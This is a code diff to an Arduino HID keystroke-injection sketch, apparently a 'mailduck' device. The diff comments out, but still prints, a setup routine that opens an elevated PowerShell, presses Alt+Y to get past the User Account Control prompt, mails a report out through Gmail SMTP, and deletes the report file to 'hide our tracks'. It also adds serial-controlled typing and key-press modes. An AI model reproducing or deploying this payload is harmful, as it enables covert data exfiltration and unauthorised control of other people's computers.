@@ -81,22 +81,19 @@ void setup()
     // Begining the Keyboard stream
     Keyboard.begin();
     delay(2000);
-
-    twoKeyCombination(KEY_LEFT_GUI,'r');  // open "run" dialog
-
+    int guiKey1 = 131;  // Library code for GUI key(windows/osx button)
+    int guiKey2 = 114; // Ascii code for r
+    twoKeyCombination(guiKey1,guiKey2);  // open "run" dialog
+    /*
     command("powershell Start-Process powershell -Verb runAs");
-    
     delay(1500);  // wait for the powershell to open
-
     Keyboard.press(KEY_LEFT_ALT);  // reply yes to User Account Control Screen
     Keyboard.press('y');
     Keyboard.releaseAll();
     delay(300);
     typeKey(KEY_RETURN);
     delay(2000);  // wait untill the system recognises y is not a command, or until powershell opens
-
     //moveWindowOffScreen();
-
     command("$SMTPServer = 'smtp.gmail.com'");
     command("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
     command("$SMTPInfo.EnableSsl = $true");
@@ -120,6 +117,7 @@ void setup()
     command("$SMTPInfo.Send($ReportEmail)");
     command("del reportfile.txt");  // hide our tracks a bit, after powershell has exited -> email has been sent(can cause trouble)
     command("exit");
+    */
     Keyboard.end();
   }
 }
@@ -132,6 +130,8 @@ void loop(){
     String typeOfCommand = serialstring.substring(0,3);  // the first four letters indicate the type of the command(e.g. "wrt=")
     String commandContent = serialstring.substring(4);  // all the letters after the fourth
     char commandContentChar[commandContent.length()];
+    commandContent.toCharArray(commandContentChar,(commandContent.length()+1));  // doesnt return anything, just copies the result in the first argument
+    int commandContentInt = commandContent.toInt();  // convert string to integer(long)
     Serial.println("----------------------New Command----------------------");
     Serial.print("serialstring=");
     Serial.println(serialstring);
@@ -141,7 +141,8 @@ void loop(){
     Serial.println(commandContent);
     Serial.print("commandContentChar=");
     Serial.println(commandContentChar);
-    commandContent.toCharArray(commandContentChar,commandContent.length());
+    Serial.print("commandContentInt=");
+    Serial.println(commandContentInt);
     if(typeOfCommand=="cmd"){       // command mode. Types a command and then presses the Return key
       Keyboard.print(commandContent);
       typeKey(KEY_RETURN);   
@@ -153,7 +154,7 @@ void loop(){
       Keyboard.write(commandContentChar);
     }
     else if(typeOfCommand=="prs"){  // press mode. Presses a modifier Key(and does not release it until an rls comes.
-      Keyboard.press(commandContentChar);      
+      Keyboard.press(commandContentInt);     // accepts modifier key codes(see mailduck's readme.md) and ASCII codes
     }
     else if(typeOfCommand=="rls"){  // release mode. Releases all the pressed modifier keys.
       Keyboard.releaseAll();
